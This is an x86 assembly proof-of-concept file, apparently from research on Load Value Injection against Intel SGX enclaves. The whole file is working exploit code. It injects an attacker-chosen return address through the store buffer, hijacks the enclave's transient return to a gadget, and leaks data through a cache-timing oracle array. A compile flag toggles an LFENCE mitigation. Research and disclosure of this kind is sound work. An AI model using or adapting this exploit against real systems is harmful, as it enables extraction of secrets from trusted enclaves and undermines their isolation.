#define OFFSET                  20
#define CHAR                    'R'
#define LFENCE                  0

    .data
rsp_backup:
    .quad 0x0

    .text
    .global ecall_init_stack
ecall_init_stack:
    /* NOTE: we setup an explicit dummy stack to easily revoke access rights and keep the poc code minimal */
    push %rax
    push %rbx

    lea page_b(%rip), %rbx
    add $OFFSET, %rbx
    movq $'B', (%rbx)
    lea do_real_ret(%rip), %rax
    mov %rax, 8(%rbx)

    pop %rbx
    pop %rax
    ret

    .text
    .align 0x1000 /* make sure ret_gadget is on the same page and in the TLB */
    .global ecall_lvi_sb_rop
    # %rdi store_pt
    # %rsi oracle_pt
ecall_lvi_sb_rop:
    mov %rsp, rsp_backup(%rip)
    lea page_b(%rip), %rsp
    add $OFFSET, %rsp

    /* transient delay */
    clflush dummy(%rip)
    mov dummy(%rip), %rax

    /* STORE TO USER ADRS */
    movq $CHAR, (%rdi)
    lea ret_gadget(%rip), %rax
    movq %rax, 8(%rdi)

    /* HIJACK TRUSTED LOAD FROM ENCLAVE STACK */
    /* should go to do_real_ret; will transiently go to ret_gadget if we fault on the stack loads */
    pop %rax
#if LFENCE
    notq (%rsp)
    notq (%rsp)
    lfence
    ret
#else
    ret
#endif

1:  jmp 1b
    mfence

do_real_ret:
    mov rsp_backup(%rip), %rsp
    ret

ret_gadget:
    shl $0xc, %rax
    movq (%rsi, %rax), %rdx
1:  jmp 1b
    mfence
